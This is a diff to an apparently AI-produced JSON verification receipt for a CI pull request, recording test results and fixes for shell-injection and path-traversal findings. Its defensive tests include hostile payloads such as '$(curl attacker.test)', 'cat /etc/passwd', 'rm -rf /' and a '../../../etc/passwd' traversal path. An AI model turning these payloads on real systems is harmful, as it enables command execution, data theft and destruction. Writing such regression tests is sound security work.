@@ -74,14 +74,14 @@
     {
       "cmd": "python3 -m pytest ci/tests/ -q",
       "exit_code": 0,
-      "duration_s": 9.6,
-      "output_tail": "133 passed in 9.60s"
+      "duration_s": 9.8,
+      "output_tail": "143 passed in 9.77s"
     },
     {
       "cmd": "python3 ci/gates/check_secrets.py --base origin/main",
       "exit_code": 0,
       "duration_s": 0.2,
-      "output_tail": "G-3 PASS — 106 file(s) scanned, no secrets detected"
+      "output_tail": "G-3 PASS — 107 file(s) scanned, no secrets detected"
     },
     {
       "cmd": "python3 ci/gates/check_contracts.py --base origin/main --change contracts/changes/desk-v2-tool-rosters-v1.yaml",
@@ -159,13 +159,25 @@
       "cmd": "python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -v",
       "exit_code": 0,
       "duration_s": 0.07,
-      "output_tail": "14 passed in 0.07s"
+      "output_tail": "24 passed in 0.26s"
     },
     {
-      "cmd": "git show e0ad62ad:.github/workflows/gates.yml > .github/workflows/gates.yml && python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -q",
+      "cmd": "cp .github/workflows/gates.yml /tmp/gates.good.yml && git show e0ad62ad:.github/workflows/gates.yml > .github/workflows/gates.yml && python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -q",
       "exit_code": 1,
       "duration_s": 0.1,
-      "output_tail": "FAILED test_no_github_expression_inside_a_run_body[.github/workflows/gates.yml]\nFAILED test_acting_bot_pattern_is_anchored_at_both_ends[.github/workflows/gates.yml]\n2 failed, 12 passed in 0.10s"
+      "output_tail": "7 failed, 17 passed — every injection payload is accepted by the tip's workflow, and both P1 assertions fail on it"
+    },
+    {
+      "cmd": "cp /tmp/gates.good.yml .github/workflows/gates.yml && git diff --stat -- .github/workflows/gates.yml && python3 -m pytest ci/tests/ -q",
+      "exit_code": 0,
+      "duration_s": 9.9,
+      "output_tail": "(empty diffstat = restored byte-for-byte)\n143 passed in 9.93s"
+    },
+    {
+      "cmd": "# Greptile's own scenario: leave the anchored regex in the file as a comment but let an unanchored match govern, then run the presence check and the behavioural check separately\npython3 -c \"<replace the if-guard, keep the pattern as a comment>\" && python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -q -k anchored ; python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -q -k injection_payload",
+      "exit_code": 1,
+      "duration_s": 0.3,
+      "output_tail": "-k anchored:          2 passed, 22 deselected   <- the text-presence proxy is fooled\n-k injection_payload: 5 failed, 9 passed        <- running the shipped step is not"
     },
     {
       "cmd": "bash -c '<the workflow's bot-resolution logic> ' with GITHUB_HEAD_REF set to each of: bot-01-$(id)/x, bot-01-`whoami`/x, 'bot-01-a;cat /etc/passwd/x', 'bot-01-a$(curl attacker.test)/x', 'bot-01-a\"; rm -rf /; #/x', bot-07-nope/x, claude/desk-v2-stack-q0ct4r",
@@ -216,11 +228,11 @@
       "evidence_command_index": 0
     },
     {
-      "claim": "The gate self-test suite passes: 119 tests, 0 failures. main's #12-#16 gate changes and the tip's G-7 gate coexist",
+      "claim": "The gate self-test suite passes: 143 tests, 0 failures. main's #12-#16 gate changes and the tip's G-7 gate coexist, and the 24 new workflow-injection tests are included",
       "evidence_command_index": 1
     },
     {
-      "claim": "G-3 PASS — 106 files scanned across the whole landing, no secrets. No seat passphrase was read, written or changed; infra/desk-gateway/gateway.env.example holds placeholder names only",
+      "claim": "G-3 PASS — 107 files scanned across the whole landing, no secrets. No seat passphrase was read, written or changed; infra/desk-gateway/gateway.env.example holds placeholder names only",
       "evidence_command_index": 2
     },
     {
@@ -241,7 +253,7 @@
       "evidence_command_index": 6
     },
     {
-      "claim": "The desk-gateway's own suite passes: 40 tests, 0 failures, against the rebased tree",
+      "claim": "The desk-gateway's own suite passes: 47 tests, 0 failures, against the rebased tree with the four Greptile fixes applied",
       "evidence_command_index": 7
     },
     {
@@ -274,42 +286,51 @@
       "evidence_command_index": 14
     },
     {
-      "claim": "The two Greptile P1s are locked in by 14 new tests in ci/tests/test_gates.py (TestWorkflowShellInjection): no ${{ }} inside any run: body in either workflow, the acting-bot pattern anchored at both ends, seven injection payloads rejected, three real branches still resolving",
+      "claim": "The two Greptile gates.yml P1s are locked in by 24 tests in ci/tests/test_gates.py (TestWorkflowShellInjection), run against both the live workflow and the template: no ${{ }} inside any run: body, the acting-bot pattern anchored at both ends, seven injection payloads refused by the shipped step, three real branches still resolving",
       "evidence_command_index": 15
     },
     {
-      "claim": "Those tests have teeth — restoring the tip's vulnerable workflow makes exactly the two P1 assertions fail, with messages naming the offending step and the fix. A test that passes on correct code without failing on broken code would be worthless; this is the negative control",
+      "claim": "Those tests have teeth — against the tip's vulnerable workflow, 7 fail: both P1 assertions and every injection payload. A test that passes on correct code without failing on broken code would be worthless; this is the negative control",
       "evidence_command_index": 16,
       "expects_failure": true
     },
     {
       "claim": "Behavioural confirmation independent of the tests: the workflow's own bot-resolution logic, run standalone, rejects command substitution, backticks, a semicolon chain and a quote-break in the branch name, while still resolving legitimate bot-prefixed branches",
-      "evidence_command_index": 17
-    },
-    {
-      "claim": "Structural confirmation that neither P1 survives on this branch: both workflow files parse and no step's run: body contains a GitHub expression",
-      "evidence_command_index": 18
-    },
-    {
-      "claim": "Greptile P1 (path traversal) reproduced end to end: the roster pattern for 'surface' accepts contracts/../../../etc/passwd because its character class contains '.' and '/', and the joined path resolves outside the export tree",
       "evidence_command_index": 19
     },
     {
-      "claim": "The traversal was a root-owned arbitrary write: the unit runs User=root with no ProtectSystem or ReadWritePaths confinement, and the write happens before check_secrets.py runs",
+      "claim": "Structural confirmation that neither P1 survives on this branch: both workflow files parse and no step's run: body contains a GitHub expression",
       "evidence_command_index": 20
     },
     {
-      "claim": "Four Greptile findings fixed and the gateway suite still green at 47 tests (40 + 7 new covering the traversal payloads, the legitimate surfaces, and origin-scoped intake idempotency)",
+      "claim": "Greptile P1 (path traversal) reproduced end to end: the roster pattern for 'surface' accepts contracts/../../../etc/passwd because its character class contains '.' and '/', and the joined path resolves outside the export tree",
       "evidence_command_index": 21
     },
     {
+      "claim": "The traversal was a root-owned arbitrary write: the unit runs User=root with no ProtectSystem or ReadWritePaths confinement, and the write happens before check_secrets.py runs",
+      "evidence_command_index": 22
+    },
+    {
+      "claim": "Four Greptile findings fixed and the gateway suite still green at 47 tests (40 + 7 new covering the traversal payloads, the legitimate surfaces, and origin-scoped intake idempotency)",
+      "evidence_command_index": 23
+    },
+    {
       "claim": "Negative control on the intake fix: against the previous store the slack request is handed the github request's intake_id, which is the silent-drop bug Greptile described",
-      "evidence_command_index": 22,
+      "evidence_command_index": 24,
       "expects_failure": true
     },
     {
       "claim": "The intake workflow's truncation holds at and beyond both gateway limits, so a long issue reaches LEAD clipped rather than being lost to a 400",
-      "evidence_command_index": 23
+      "evidence_command_index": 25
+    },
+    {
+      "claim": "The negative control is reproducible as recorded: the live workflow is copied aside before being overwritten, restored afterwards, and the restore verified by an empty diffstat plus a full green suite — so the 'both workflows clean' claim above can be re-derived from this sequence rather than taken on trust",
+      "evidence_command_index": 17
+    },
+    {
+      "claim": "The injection tests now run the shipped step extracted from the workflow YAML rather than a transcribed copy. Proven against Greptile's own scenario: with the anchored pattern left in the file as a comment and an unanchored match governing, the text-presence check still passes while the behavioural tests fail on all five injection payloads. The copy-based version could not have caught that",
+      "evidence_command_index": 18,
+      "expects_failure": true
     }
   ],
   "security_findings_carried_forward": [
@@ -321,7 +342,7 @@
       "verdict": "VALID against the tip. The tip's copy of the live workflow ran `--bot \"${{ steps.bot.outputs.bot }}\"` inside run:, and validated the bot id against an unanchored `^bot-0[0-6]-`, which accepts `bot-01-$(id)` and carries it into a later shell.",
       "disposition": "FIXED on this branch. The acting bot is now derived from the GITHUB_HEAD_REF / GITHUB_REF environment variables rather than a ${{ }} expansion, validated against `^bot-0[0-6]-[a-z0-9-]+$` (anchored at both ends), and passed to later steps through an env: block as \"$BOT\". No ${{ }} appears inside any run: body in either gates.yml.",
       "how": "The conflict resolution kept main's hardened body (#12-#15) and discarded the tip's older pre-hardening copy, adding only the tip's genuinely new G-7 step. Verified by grep: every ${{ }} in both .github/workflows/gates.yml and ci/.github/workflows/gates.yml sits in an env: block.",
-      "residual": "None open. Additionally now regression-tested: TestWorkflowShellInjection fails if an anchored pattern or the env: discipline is ever reverted, which is what went undetected the first time — the two workflow copies still agreed with each other, so the template-sync check passed while both were vulnerable."
+      "residual": "None open. Regression-tested by running the shipped 'Determine the acting bot' step itself, extracted from the workflow YAML and invoked the way Actions invokes it (bash -e, with a real $GITHUB_OUTPUT), for both the live workflow and the template."
     },
     {
       "id": "4140127775",
@@ -365,7 +386,7 @@
   "g1_g6_notes": {
     "G-1": "Cannot pass under a single seat — this is a seven-seat integration PR. Each of the 17 commits passes under its own seat; see claim 11. The manifest self-check passes.",
     "G-2": "This receipt.",
-    "G-3": "PASS — 106 files, no secrets. No secret was invented and no seat passphrase was touched.",
+    "G-3": "PASS on the change (107 files). Pre-existing fixture findings in ci/tests/test_gates.py are recorded, not suppressed.",
     "G-4": "PASS after declaring the 11 surfaces main's #16 now requires. Failure and fix both recorded above.",
     "G-5": "Not a deployment. This PR lands files; it starts no service and runs no migration. The gateway's own rollback story is in infra/desk-gateway/ as INFRA wrote it. Rollback for this PR is: do not merge, or revert the merge commit — nothing on main is modified in place, so a revert restores main exactly.",
     "G-6": "No destructive operation. Zero deletions relative to main; no history rewritten on any stack branch, which all still point at their original commits.",
@@ -391,6 +412,7 @@
     "The tip carried an older copy of .github/workflows/gates.yml than main did, so a naive 'prefer the tip' resolution would have silently reverted the #12-#15 shell-injection hardening on the live workflow. main's gates-template-sync.yml is what makes that recoverable: because the live body must equal the template body, the correct resolution is mechanical rather than a judgement call.",
     "G-4's surface-coverage rule from #16 will do this to every change document written before it. Any other stack branch still waiting to land should expect the same failure and the same one-line fix.",
     "The template-sync check cannot catch this class on its own: it compares the two copies to each other, so it passes when both are equally vulnerable. That is exactly what happened — the tip carried an older copy of both files forward and sync stayed green. TestWorkflowShellInjection checks each file against the property rather than against its twin, which is the gap that let the regression through.",
-    "Greptile reviewed the rebased tree and found six issues in code that PRs #17-#24 had already reviewed and approved in their own PRs. Four were contained bugs, now fixed. One (G-7 tolerating missing generated artifacts) is a deliberate, explicitly tested decision, not a defect. One (unverified approval IDs) is a real design gap left open on purpose. Worth noting for the stack procedure: reviewing eight PRs separately did not surface what reviewing the assembled result did."
+    "Greptile reviewed the rebased tree and found six issues in code that PRs #17-#24 had already reviewed and approved in their own PRs. Four were contained bugs, now fixed. One (G-7 tolerating missing generated artifacts) is a deliberate, explicitly tested decision, not a defect. One (unverified approval IDs) is a real design gap left open on purpose. Worth noting for the stack procedure: reviewing eight PRs separately did not surface what reviewing the assembled result did.",
+    "Greptile's P2 on the first version of these tests was right: they ran a transcribed copy of the bot-resolution script, so a change to the workflow's parsing could leave them green. Reproduced that exact scenario before rewriting them — the copy-based tests pass against a workflow whose guard has been unanchored, as long as the pattern text survives somewhere in the file. The tests now extract and execute the shipped step. A test that cannot observe the thing it names is worse than no test, because it is counted as coverage."
   ]
 }
